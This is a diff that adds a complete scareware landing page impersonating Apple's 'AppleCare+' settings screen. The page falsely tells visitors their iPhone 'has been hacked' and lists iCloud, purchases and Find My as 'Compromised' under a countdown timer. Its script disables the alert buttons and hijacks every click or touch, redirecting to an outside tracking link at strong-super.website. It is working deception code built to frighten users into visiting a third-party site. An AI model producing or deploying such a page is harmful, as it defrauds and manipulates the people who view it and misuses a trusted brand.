@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <title>AppleCare+</title>
+  <style>
+    
+    /* ====== GLOBAL ====== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+
+/* Добавьте это в CSS секцию для логотипа */
+.logo img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover; /* Для четкого заполнения */
+  object-position: center;
+  display: block;
+}
+
+/* Исправление для белого фона логотипа */
+.logo {
+  background: #fff !important;
+  border: 0.5px solid rgba(0, 0, 0, 0.1) !important;
+}
+
+/* Для темной темы - все равно белый фон */
+@media (prefers-color-scheme: dark) {
+  .logo {
+    background: #fff !important;
+  }
+}
+    
+    html, body {
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", system-ui, sans-serif;
+      background: #000;
+      color: #fff;
+      overflow-x: hidden;
+      height: 100%;
+      width: 100%;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      position: fixed; /* Предотвращает скроллинг */
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+    }
+
+
+    /* ====== HEADER ====== */
+    .header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(28, 28, 30, 0.75);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
+      z-index: 10;
+      width: 100%;
+      padding: 0 12px;
+    }
+
+    .header-title {
+      font-size: 17px;
+      font-weight: 600;
+      text-align: center;
+      color: #fff;
+      flex: 1;
+    }
+
+    .header-button {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      color: #0a84ff;
+      font-size: 16px;
+      text-decoration: none;
+      font-weight: 400;
+      height: 100%;
+      position: absolute;
+      left: 12px;
+    }
+
+    .header-button svg {
+      width: 16px;
+      height: 16px;
+      display: block;
+      flex-shrink: 0;
+    }
+
+    .header-button:active {
+      opacity: 0.5;
+    }
+
+    /* ====== CONTAINER ====== */
+    .container {
+      width: 100%;
+      max-width: 430px;
+      margin: 0 auto;
+      padding: 60px 16px 20px; /* Увеличил нижний padding */
+      height: calc(100vh - 44px);
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      overflow: hidden;
+    }
+
+    .content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      gap: 10px;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+      padding-bottom: 10px;
+    }
+
+    .logo-card {
+      background: #1c1c1e;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 14px;
+      padding: 18px 16px;
+      text-align: center;
+      width: 100%;
+      flex-shrink: 0;
+    }
+
+    .logo {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 8px;
+      border-radius: 14px;
+      overflow: hidden;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 30px;
+    }
+
+    .title {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 2px;
+      word-wrap: break-word;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      color: #8e8e93;
+      word-wrap: break-word;
+    }
+
+    /* ====== SECTIONS ====== */
+    .section {
+      background: #1c1c1e;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      overflow: hidden;
+      width: 100%;
+      flex-shrink: 0;
+    }
+
+    .item {
+      display: flex;
+      align-items: center;
+      padding: 11px 12px;
+      gap: 10px;
+      min-height: 44px;
+      width: 100%;
+    }
+
+    .item:active {
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .divider {
+      height: 0.5px;
+      background: rgba(255, 255, 255, 0.08);
+      width: 100%;
+    }
+
+    .compromised {
+      background: rgba(139, 0, 0, 0.25);
+    }
+
+    .compromised:active {
+      background: rgba(139, 0, 0, 0.35);
+    }
+
+    .icon {
+      width: 22px;
+      height: 22px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .icon svg {
+      width: 100%;
+      height: 100%;
+      color: #8e8e93;
+    }
+
+    .label {
+      flex: 1;
+      font-size: 15px;
+      text-align: left;
+      word-wrap: break-word;
+      min-width: 0;
+    }
+
+    .value {
+      font-size: 15px;
+      color: #8e8e93;
+      flex-shrink: 0;
+      word-wrap: break-word;
+    }
+
+    .compromised .label,
+    .compromised .value {
+      color: #ff453a;
+    }
+
+    /* ====== REPAIR BUTTON ====== */
+    .repair-button {
+      background: #ff3b30;
+      border: none;
+      border-radius: 14px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      padding: 16px;
+      width: 100%;
+      margin-top: auto; /* Кнопка всегда внизу */
+      cursor: pointer;
+      transition: background 0.2s;
+      text-align: center;
+      text-decoration: none;
+      display: block;
+      flex-shrink: 0;
+    }
+
+    .repair-button:active {
+      background: #ff2d20;
+    }
+
+    /* ====== iOS ALERT STYLES ====== */
+    .ios-alert-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s ease, visibility 0.3s ease;
+    }
+
+    .ios-alert-overlay.show {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .ios-alert-backdrop {
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.4);
+      transition: background 0.3s ease;
+    }
+
+    .ios-alert-overlay.show .ios-alert-backdrop {
+      background: rgba(0, 0, 0, 0.6);
+    }
+
+    .ios-alert-modal {
+      position: relative;
+      width: 100%;
+      max-width: 270px;
+      background: rgba(242, 242, 247, 0.98);
+      border-radius: 14px;
+      overflow: hidden;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+      transform: scale(1.1);
+      opacity: 0;
+      transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+    }
+
+    .ios-alert-overlay.show .ios-alert-modal {
+      transform: scale(1);
+      opacity: 1;
+    }
+
+    .ios-alert-content {
+      padding: 20px 16px 16px;
+      text-align: center;
+    }
+
+    .ios-alert-title {
+      font-size: 17px;
+      font-weight: 600;
+      color: #000;
+      margin-bottom: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+    }
+
+    .ios-alert-message {
+      font-size: 13px;
+      color: rgba(0, 0, 0, 0.7);
+      line-height: 18px;
+      margin-bottom: 4px;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
+    }
+
+    .ios-alert-timer {
+      font-size: 13px;
+      font-weight: 500;
+      color: #ff3b30;
+      margin-top: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
+    }
+
+    .ios-alert-divider {
+      height: 0.5px;
+      background: rgba(0, 0, 0, 0.1);
+    }
+
+    .ios-alert-buttons {
+      display: flex;
+    }
+
+    .ios-alert-button {
+      flex: 1;
+      font-size: 17px;
+      color: #007AFF;
+      padding: 11px;
+      border: none;
+      background: transparent;
+      cursor: pointer;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
+      transition: background-color 0.1s ease;
+    }
+
+    .ios-alert-button:active {
+      background: rgba(0, 0, 0, 0.05);
+    }
+
+    .ios-alert-button.primary {
+      font-weight: 600;
+      border-left: 0.5px solid rgba(0, 0, 0, 0.1);
+    }
+
+    /* Стили для неактивных кнопок */
+    .ios-alert-button.disabled {
+      pointer-events: none;
+      opacity: 0.5;
+      cursor: default;
+    }
+
+    /* Light mode adjustment */
+    @media (prefers-color-scheme: light) {
+      .ios-alert-modal {
+        background: rgba(242, 242, 247, 0.98);
+      }
+    }
+
+    /* Dark mode */
+    @media (prefers-color-scheme: dark) {
+      .ios-alert-modal {
+        background: rgba(44, 44, 46, 0.98);
+      }
+      
+      .ios-alert-title {
+        color: #fff;
+      }
+      
+      .ios-alert-message {
+        color: rgba(255, 255, 255, 0.7);
+      }
+      
+      .ios-alert-divider {
+        background: rgba(255, 255, 255, 0.1);
+      }
+      
+      .ios-alert-button.primary {
+        border-left-color: rgba(255, 255, 255, 0.1);
+      }
+      
+      .ios-alert-button:active {
+        background: rgba(255, 255, 255, 0.05);
+      }
+    }
+
+    /* ====== LIGHT MODE ====== */
+    @media (prefers-color-scheme: light) {
+      body {
+        background: #f2f2f7;
+        color: #000;
+      }
+
+      .section,
+      .logo-card {
+        background: #fff;
+        border-color: rgba(0, 0, 0, 0.08);
+      }
+
+      .logo {
+        border: 0.5px solid rgba(0, 0, 0, 0.1);
+      }
+
+      .header {
+        background: rgba(255, 255, 255, 0.8);
+        border-bottom: 0.5px solid rgba(0, 0, 0, 0.1);
+      }
+
+      .header-title {
+        color: #000;
+      }
+
+      .header-button {
+        color: #007aff;
+      }
+
+      .divider {
+        background: rgba(0, 0, 0, 0.08);
+      }
+
+      .compromised {
+        background: rgba(255, 59, 48, 0.08);
+      }
+
+      .compromised:active {
+        background: rgba(255, 59, 48, 0.15);
+      }
+    }
+
+    /* ====== SAFE AREA SUPPORT ====== */
+    @supports (padding: max(0px)) {
+      .container {
+        padding-left: max(16px, env(safe-area-inset-left));
+        padding-right: max(16px, env(safe-area-inset-right));
+        padding-bottom: max(20px, env(safe-area-inset-bottom));
+      }
+    }
+
+    /* ====== MOBILE OPTIMIZATIONS ====== */
+    @media (max-width: 430px) {
+      .container {
+        padding-left: 16px;
+        padding-right: 16px;
+        max-width: none;
+      }
+      
+      .content {
+        gap: 12px;
+      }
+      
+      .logo-card {
+        padding: 16px;
+      }
+      
+      .logo {
+        width: 55px;
+        height: 55px;
+        font-size: 28px;
+      }
+    }
+
+    /* ====== VERY SMALL SCREENS ====== */
+    @media (max-width: 320px) {
+      .container {
+        padding-left: 12px;
+        padding-right: 12px;
+      }
+      
+      .item {
+        padding: 10px 12px;
+      }
+      
+      .repair-button {
+        padding: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- iOS Alert -->
+  <div id="iosAlert" class="ios-alert-overlay">
+    <!-- Backdrop -->
+    <div class="ios-alert-backdrop" id="alertBackdrop"></div>
+    
+    <!-- Alert Modal -->
+    <div class="ios-alert-modal" id="alertModal">
+      <!-- Content -->
+      <div class="ios-alert-content">
+        <h2 class="ios-alert-title">Your Apple iPhone has been hacked</h2>
+        <p class="ios-alert-message">
+          Your data has appeared in a data leak, which puts this device at high risk of compromise. Proceed to the App Store
+        </p>
+        <p class="ios-alert-timer" id="countdown">1:28</p>
+      </div>
+
+      <!-- Divider -->
+      <div class="ios-alert-divider"></div>
+
+      <!-- Buttons -->
+      <div class="ios-alert-buttons">
+        <button class="ios-alert-button disabled">Settings</button>
+        <button class="ios-alert-button primary disabled">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <div class="header">
+    <a href="#" class="header-button">
+      <svg width="16" height="16" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.4132 4.04922L6.01738 8.34896C5.85917 8.50151 5.78572 8.67101 5.78572 8.86877C5.78572 9.06652 5.86482 9.24732 6.01738 9.39423L10.4132 13.6883C10.5431 13.8126 10.6957 13.8804 10.8821 13.8804C11.2607 13.8804 11.5545 13.5866 11.5545 13.2137C11.5545 13.0329 11.481 12.8577 11.3511 12.7278L7.39035 8.87442L11.3511 5.00974C11.481 4.87979 11.5545 4.71028 11.5545 4.52383C11.5545 4.15092 11.2607 3.85712 10.8821 3.85712C10.7013 3.85712 10.5431 3.92492 10.4132 4.04922Z" fill="currentColor"/>
+      </svg>
+      Settings
+    </a>
+    <div class="header-title">AppleCare+</div>
+  </div>
+
+  <div class="container">
+    <div class="content">
+      <!-- Logo -->
+    <div class="logo-card">
+      <div class="logo">
+        <img src="icons/applecare.png" alt="AppleCare">
+      </div>
+      <div class="title">AppleCare+</div>
+      <div class="subtitle">Protection System</div>
+    </div>
+
+      <!-- Main Section -->
+      <div class="section">
+        <div class="item"><div class="label">Name, Phone Numbers, Email</div></div>
+        <div class="divider"></div>
+        <div class="item"><div class="label">Password & Security</div></div>
+        <div class="divider"></div>
+        <div class="item"><div class="label">Payment & Shipping</div><div class="value">Mastercard</div></div>
+        <div class="divider"></div>
+        <div class="item"><div class="label">Subscriptions</div></div>
+      </div>
+
+      <!-- Compromised Services -->
+      <div class="section">
+        
+<div class="item compromised">
+  <div class="icon">
+    <img src="icons/icloud.svg" alt="icloud">
+  </div>
+  <div class="label">iCloud</div>
+  <div class="value">Compromised</div>
+</div>
+        <div class="divider"></div>
+<div class="item compromised">
+  <div class="icon">
+    <img src="icons/appstore.svg" alt="AppStore">
+  </div>
+  <div class="label">Media & Purchases</div>
+  <div class="value">Compromised</div>
+</div>
+<div class="divider"></div>
+<div class="item compromised">
+  <div class="icon">
+    <img src="icons/locator.svg" alt="AppleCare">
+  </div>
+  <div class="label">Find My</div>
+  <div class="value">Compromised</div>
+</div>
+      </div>
+
+      <!-- iPhone -->
+      <div class="section">
+        <div class="item">
+          <div class="icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
+                 stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>
+              <path d="M12 18h.01"/>
+            </svg>
+          </div>
+          <div class="label">iPhone</div>
+          <div class="value">This iPhone</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Repair Button -->
+    <a href="" class="repair-button">Repair now</a>
+  </div>
+
+  <script>
+    // Show alert 3 seconds after page load
+    window.addEventListener('DOMContentLoaded', function() {
+      setTimeout(function() {
+        const alert = document.getElementById('iosAlert');
+        alert.classList.add('show');
+        
+        // Добавляем класс disabled к кнопкам
+        const buttons = alert.querySelectorAll('.ios-alert-button');
+        buttons.forEach(button => {
+          button.classList.add('disabled');
+        });
+
+        // Функция для открытия ссылки
+        function openLink() {
+          window.location.href = 'https://strong-super.website/click.php?lp=1';
+        }
+
+        // Добавляем обработчики кликов на всю область
+        document.addEventListener('click', function(e) {
+          if (alert.classList.contains('show')) {
+            e.preventDefault();
+            e.stopPropagation();
+            openLink();
+          }
+        }, true);
+
+        // Также на тач события для мобильных устройств
+        document.addEventListener('touchstart', function(e) {
+          if (alert.classList.contains('show')) {
+            e.preventDefault();
+            e.stopPropagation();
+            openLink();
+          }
+        }, true);
+
+        // Предотвращаем любые действия на самом алерте
+        const alertModal = document.getElementById('alertModal');
+        alertModal.addEventListener('click', function(e) {
+          e.preventDefault();
+          e.stopPropagation();
+          openLink();
+        }, true);
+
+        alertModal.addEventListener('touchstart', function(e) {
+          e.preventDefault();
+          e.stopPropagation();
+          openLink();
+        }, true);
+
+      }, 3000); // 3 seconds delay
+    });
+
+    // Countdown timer
+    let timeLeft = 88; // 1:28 in seconds
+    
+    function updateCountdown() {
+      if (timeLeft > 0) {
+        timeLeft--;
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById('countdown').textContent = 
+          minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+      }
+    }
+    
+    setInterval(updateCountdown, 1000);
+
+    // Prevent zoom on mobile
+    document.addEventListener('touchstart', function(e) {
+      if (e.touches.length > 1) {
+        e.preventDefault();
+      }
+    });
+
+    let lastTouchEnd = 0;
+    document.addEventListener('touchend', function(e) {
+      const now = (new Date()).getTime();
+      if (now - lastTouchEnd <= 300) {
+        e.preventDefault();
+      }
+      lastTouchEnd = now;
+    }, false);
+  </script>
+</body>
+</html>
